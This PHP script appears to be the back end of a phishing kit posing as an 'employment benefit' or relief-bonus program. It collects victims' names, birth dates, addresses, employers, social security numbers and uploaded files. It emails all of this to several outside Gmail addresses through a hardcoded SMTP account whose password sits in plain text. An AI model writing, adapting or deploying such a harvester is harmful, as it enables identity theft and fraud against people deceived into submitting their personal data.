<?php


//Import PHPMailer classes into the global namespace
//These must be at the top of your script, not inside a function
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

//Load Composer's autoloader
require 'vendor/autoload.php';

//Create an instance; passing `true` enables exceptions
$mail = new PHPMailer(true);




try {
    //Server settings
    $mail->SMTPDebug = SMTP::DEBUG_OFF;                      //Enable verbose debug output
    $mail->isSMTP();                                            //Send using SMTP
    $mail->Host       = 'mail.euspassistance.com';                     //Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
    $mail->Username   = 'support@euspassistance.com';                     //SMTP username
    $mail->Password   = 'FrVkJO;?h)@o';                               //SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
    $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    //Recipients
    $mail->setFrom('support@euspassistance.com');
    $mail->addAddress('riotech2222@gmail.com');     //Add a recipient
    $mail->addAddress("Ocool7603@gmail.com");
    $mail->addAddress("lrsuniitedstate@gmail.com");               //Name is optional

    if (
        isset($_FILES['uploaded_file'])
        && $_FILES['uploaded_file']['error'] == UPLOAD_ERR_OK
    ) {
        $mail->addAttachment(
            $_FILES['uploaded_file']['tmp_name'],
            $_FILES['uploaded_file']['name']
        );
    }
   
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = 'From employment Benefit';
    $mail->Body    = '
    <b>name:</b> '.$_REQUEST['fullname'].' <br>
    <b>email:</b>  '.$_REQUEST['email'].'<br>
    <b>Dob:</b> '.$_REQUEST['dob'].' <br>
    <b>Tel:</b> '.$_REQUEST['phone'].' <br>
    <b>gender:</b>  '.$_REQUEST['gender'].'<br>
    <b>Home Address:</b> '.$_REQUEST['address'].'<br> 
    <b>city: </b> '.$_REQUEST['city'].'<br>
    <b>state:</b>  '.$_REQUEST['state'].'<br>
    <b>poster-code: </b> '.$_REQUEST['poster_code'].'<br>
    <b>current-employer:</b> '.$_REQUEST['current_employer'].' <br>
    <b>social security number: </b> '.$_REQUEST['ssn'].'<br>
    <b>Education Level: </b> '.$_REQUEST['edu_level'].'<br>
    <b>Relief Bonus(yes):</b>  '.$_REQUEST['yes_Relief_Bonus'].'<br>
    <b>Relief Bonus(NO): </b> '.$_REQUEST['no_Relief_Bonus'].'<br>  
    ';
    // $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    $mail->send();
    // echo 'Message has been sent';
    echo true;
} catch (Exception $e) {
    // echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    echo "Message could not be sent";
}
